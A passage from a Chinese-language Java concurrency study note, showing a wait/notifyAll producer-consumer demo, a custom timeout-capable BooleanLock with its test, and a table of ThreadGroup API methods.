<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="多线程通信">多线程通信</h3>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211227170019463.png" alt="image-20211227170019463"></p>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211227170133400.png" alt="image-20211227170133400"></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * Demo
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProducerAndConsumerVersion3</span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">volatile</span> <span class="token keyword">boolean</span> isProduced <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">Object</span> <span class="token constant">LOCK</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">produce</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token constant">LOCK</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span>isProduced<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">try</span> <span class="token punctuation">{</span>
                    <span class="token constant">LOCK</span><span class="token punctuation">.</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"：wait"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            <span class="token operator">++</span>i<span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"：produced-&gt;"</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
            isProduced <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token constant">LOCK</span><span class="token punctuation">.</span><span class="token function">notifyAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">consume</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token constant">LOCK</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>isProduced<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">try</span> <span class="token punctuation">{</span>
                    <span class="token constant">LOCK</span><span class="token punctuation">.</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"：wait"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>

            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"：consumed-&gt;"</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
            isProduced <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token constant">LOCK</span><span class="token punctuation">.</span><span class="token function">notifyAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">ProducerAndConsumerVersion3</span> producerAndConsumerVersion3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProducerAndConsumerVersion3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Stream</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"P1"</span><span class="token punctuation">,</span> <span class="token string">"P2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>name <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token annotation punctuation">@Override</span>
                <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        producerAndConsumerVersion3<span class="token punctuation">.</span><span class="token function">produce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">try</span> <span class="token punctuation">{</span>
                            <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Stream</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"C1"</span><span class="token punctuation">,</span> <span class="token string">"C2"</span><span class="token punctuation">,</span> <span class="token string">"C3"</span><span class="token punctuation">,</span> <span class="token string">"C4"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>name <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token annotation punctuation">@Override</span>
                <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        producerAndConsumerVersion3<span class="token punctuation">.</span><span class="token function">consume</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">try</span> <span class="token punctuation">{</span>
                            <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="自定义显示锁">自定义显示锁</h3>
<ol>
<li>Lock接口</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Collection</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Lock</span> <span class="token punctuation">{</span>
    <span class="token keyword">void</span> <span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span><span class="token punctuation">;</span>

    <span class="token keyword">void</span> <span class="token function">lock</span><span class="token punctuation">(</span><span class="token keyword">long</span> mills<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span><span class="token punctuation">,</span> <span class="token class-name">TimeoutException</span><span class="token punctuation">;</span>

    <span class="token keyword">void</span> <span class="token function">unLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token class-name">Collection</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Thread</span><span class="token punctuation">&gt;</span></span> <span class="token function">getBlockedThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">int</span> <span class="token function">getBlockedSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">class</span> <span class="token class-name">TimeoutException</span> <span class="token keyword">extends</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token class-name">TimeoutException</span><span class="token punctuation">(</span><span class="token class-name">String</span> message<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">super</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ol start="2">
<li>接口实现</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Collection</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Collections</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BooleanLock</span> <span class="token keyword">implements</span> <span class="token class-name">Lock</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">boolean</span> initValue <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token class-name">Thread</span> currentThread<span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token class-name">Collection</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Thread</span><span class="token punctuation">&gt;</span></span> blockedThreadCollection <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>initValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            blockedThreadCollection<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        initValue <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        currentThread <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        blockedThreadCollection<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">lock</span><span class="token punctuation">(</span><span class="token keyword">long</span> mills<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span><span class="token punctuation">,</span> <span class="token class-name">TimeoutException</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>mills <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">long</span> waitMills <span class="token operator">=</span> mills<span class="token punctuation">;</span>
        <span class="token keyword">long</span> endTime <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> waitMills<span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>initValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>waitMills <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TimeoutException</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" waiting timeout"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token comment">// 重新设置等待时间</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">wait</span><span class="token punctuation">(</span>waitMills<span class="token punctuation">)</span><span class="token punctuation">;</span>
            waitMills <span class="token operator">=</span> endTime <span class="token operator">-</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">this</span><span class="token punctuation">.</span>initValue <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>currentThread <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">unLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> currentThread<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            initValue <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" release the monitor"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">notifyAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">Collection</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Thread</span><span class="token punctuation">&gt;</span></span> <span class="token function">getBlockedThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">unmodifiableCollection</span><span class="token punctuation">(</span>blockedThreadCollection<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getBlockedSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> blockedThreadCollection<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ol start="3">
<li>调用</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Arrays</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BooleanLockTest</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">final</span> <span class="token class-name">BooleanLock</span> booleanLock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BooleanLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span><span class="token string">"W1"</span><span class="token punctuation">,</span> <span class="token string">"W2"</span><span class="token punctuation">,</span> <span class="token string">"W3"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>name <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
                    <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
                        <span class="token keyword">try</span> <span class="token punctuation">{</span>
                            booleanLock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token number">5_000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" got the lock"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token function">work</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> <span class="token operator">|</span> <span class="token class-name">Lock<span class="token punctuation">.</span>TimeoutException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
                            booleanLock<span class="token punctuation">.</span><span class="token function">unLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">work</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" is working..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10_000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Chapter6：Thread-Group">Chapter6：Thread Group</h2>
<h3 id="Thread-与-ThreadGroup">Thread 与 ThreadGroup</h3>
<p><img src="https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/image-20211228162829691.png" alt="image-20211228162829691"></p>
<h3 id="基本操作">基本操作</h3>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>activeCount()</td>
<td>用于获取group中活跃的线程，这只是个估计值，并不能百分之百地保证数字一定正确，原因前面已经分析过，该方法会递归获取其他子group中的活跃线程。</td>
</tr>
<tr>
<td>activeGroupCount()</td>
<td>用于获取group中活跃的子group，这也是一个近似估值，该方法也会递归获取所有的子group。</td>
</tr>
<tr>
<td>getMaxPriority()</td>
<td>用于获取group的优先级，默认情况下，Group的优先级为10，在该group中，所有线程的优先级都不能大于group的优先级</td>
</tr>
<tr>
<td>getName()</td>
<td>用于获取group的名字。</td>
</tr>
<tr>
<td>getParent()</td>
<td>用于获取group的父group，如果父group不存在，则会返回null，比如systemgroup的父group就为null。</td>
</tr>
<tr>
<td>list()</td>
<td>该方法没有返回值，执行该方法会将group中所有的活跃线程信息全部输出到控制台，也就是System.out0</td>
</tr>
<tr>
<td>parentOf(ThreadGroup g)</td>
<td>会判断当前group是不是给定group的父group，另外如果给定的group就是自己本身，那么该方法也会返回true。</td>
</tr>
<tr>
<td>setMaxPriority(int pri)</td>
<td>会指定group的最大优先级，最大优先级不能超过父group的最大优先级，执行该方法不仅会改变当前group的最大优先级，还会改变所有子group的最大优先级</td>
</tr>
</tbody>
</table>
<h3 id="守护ThreadGroup">守护ThreadGroup</h3>
<p><code>public final void setDaemon(boolean daemon)</code></p>
<pre class="line-numbers language-none"><code class="language-none">First, the checkAccess method of this thread group is called with no arguments; 
this may result in a security exception.
A daemon thread group is automatically destroyed when its last thread is stopped or its last thread group is destroyed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * Demo
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThreadGroupApi</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
        <span class="token class-name">ThreadGroup</span> tg1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ThreadGroup</span><span class="token punctuation">(</span><span class="token string">"group1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
